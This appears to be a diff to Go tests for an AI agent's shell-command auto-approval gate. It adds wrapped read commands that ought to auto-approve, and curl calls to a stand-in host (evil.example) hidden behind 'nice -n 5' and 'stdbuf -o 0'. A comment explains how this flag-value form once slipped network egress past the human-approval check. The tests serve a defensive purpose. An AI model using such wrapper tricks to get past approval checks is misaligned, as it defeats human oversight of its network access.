@@ -84,6 +84,13 @@ func TestAutoMode_PeeledWrappers_AutoApprove(t *testing.T) {
 		"env CI=1 ls -la",
 		"nohup git status",
 		"env CGO_ENABLED=0 timeout 10m git diff",
+		// Review finding "important 4": the attached AND the separate
+		// option-value forms of nice/stdbuf must both still peel to the inner
+		// read, so the arity model widens nothing shut that worked before.
+		"nice -n5 git log",
+		"nice -n 5 git log",
+		"stdbuf -oL git status",
+		"stdbuf -o 0 git status",
 	} {
 		approve, called := newApproveRecorder(false)
 		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
@@ -112,6 +119,16 @@ func TestAutoMode_WrapperPeelDoesNotLaunder(t *testing.T) {
 		"env GIT_PAGER=/tmp/evil git log",
 		"timeout 30 sudo git log",
 		"env CI=1 ./evil",
+		// Review finding "important 4". `nice -n 5` and `stdbuf -o 0` take
+		// their option value as a SEPARATE word. The old blind "drop leading -
+		// words" peel ate `-n` only, leaving `5` as argv[0] and `curl <url>` as
+		// its arguments: the egress name table saw "5", isCatastrophicRm saw
+		// "5", and both `curl` and the URL resolved as cwd-relative path words
+		// that proved in-workspace — a silent VerdictAllow on arbitrary network
+		// egress. Whether the peel now models the flag or refuses it, neither
+		// of these may reach a verdict without a human.
+		"nice -n 5 curl http://evil.example/x",
+		"stdbuf -o 0 curl http://evil.example/x",
 	} {
 		// approve=true so a routed-to-human ask succeeds and is distinguishable
 		// from a silent auto-approve by the recorder flag.
